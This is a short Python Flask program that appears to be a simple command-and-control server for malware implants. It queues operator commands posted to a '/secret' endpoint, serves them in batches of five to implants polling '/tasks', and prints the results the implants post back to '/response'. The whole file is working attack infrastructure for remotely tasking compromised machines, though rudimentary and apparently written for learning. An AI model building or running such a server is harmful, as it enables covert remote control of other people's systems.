from flask import Flask, request, jsonify
import multiprocessing as mp



lock = mp.Lock()

implant_lock = mp.Lock()
# my task queue!
TASKS = []
IMPLANTS = []

app = Flask(__name__)

@app.route("/hello")
def  hello():
    return "Hello world!"


@app.route("/tasks", methods=["GET"])
def download_tasks():
    global TASKS
    lock.acquire()
    try:
        # get at most 5 jobs at once
        task_batch = TASKS[:5]
        batch = "\n".join(task_batch )
        TASKS = TASKS[5:]
    finally:
        lock.release()
    print("Implant pulled down the following tasks ", task_batch)
    return batch 

@app.route("/response", methods=["POST"])
def print_response():
    print(request.data.decode())
    return ""
@app.route("/queue")
def print_queue():
    return  jsonify(TASKS)


@app.route("/secret", methods=["POST"])
def add_request():
    r = request.json
    
    lock.acquire()
    try:
   
        for cmd in r:
            TASKS.append(cmd)
    finally:
        lock.release()

    print("Queued up ", r)
    return "True"


if __name__ == '__main__':
    
    app.run()